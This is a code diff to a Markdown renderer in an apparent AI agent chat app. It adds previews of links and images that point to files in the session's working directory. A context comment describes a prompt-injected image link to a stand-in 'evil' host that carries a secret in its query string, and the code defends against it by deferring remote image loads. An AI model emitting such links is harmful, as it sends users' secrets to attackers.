@@ -2,6 +2,7 @@ import { Marked } from "marked";
 import DOMPurify from "dompurify";
 import { getLang, t } from "./i18n";
 import { remoteImageHost } from "./remote-image";
+import { cleanWorkdirPath, isWorkdirPath } from "./files";
 import { MARKED_OPTIONS, blocksOf, streamSplit } from "./markdown-split";
 
 const md = new Marked(MARKED_OPTIONS);
@@ -23,6 +24,8 @@ md.use({
 		link({ href, title, tokens }) {
 			const inner = this.parser.parseInline(tokens);
 			const t = title ? ` title="${escapeHtml(title)}"` : "";
+			// A relative link is a file in the session's working directory (the agent wrote it): preview it in the app.
+			if (isWorkdirPath(href)) return `<a href="#" class="wd-file"${t} data-file="${escapeHtml(cleanWorkdirPath(href))}">${inner}</a>`;
 			return `<a href="${escapeHtml(href)}"${t} data-ext rel="noopener noreferrer">${inner}</a>`;
 		},
 		// A remote image is fetched the moment it is in the DOM, so a prompt-injected `![](https://evil/?d=<secret>)`
@@ -30,6 +33,8 @@ md.use({
 		// user presses it (see Markdown.svelte). Raw HTML <img> is dropped by the sanitizer below.
 		image({ href, text }) {
 			const alt = escapeHtml(text || "");
+			// Our own server's file, not a third party: Markdown.svelte fetches it with the token and shows it inline.
+			if (isWorkdirPath(href)) return `<span class="wd-img" data-wd-src="${escapeHtml(cleanWorkdirPath(href))}" data-alt="${alt}">${alt || escapeHtml(cleanWorkdirPath(href))}</span>`;
 			const host = remoteImageHost(href);
 			if (!host) return alt;
 			return (
@@ -61,7 +66,7 @@ export function renderMarkdown(src: string, opts: { cache?: boolean } = {}): str
 	// Streaming produces a new prefix every frame; caching those would evict the finished messages the cache is for.
 	const store = opts.cache ?? true;
 	const html = DOMPurify.sanitize(md.parse(src, { async: false }) as string, {
-		ADD_ATTR: ["data-copy", "data-ext", "data-img-src", "data-alt"],
+		ADD_ATTR: ["data-copy", "data-ext", "data-img-src", "data-alt", "data-file", "data-wd-src"],
 		FORBID_TAGS: ["style", "form", "input", "iframe", "object", "embed", "img", "picture", "source", "video", "audio", "link", "meta"],
 	});
 	// Finished messages are re-rendered on every sidebar toggle; keep a small cache for them.
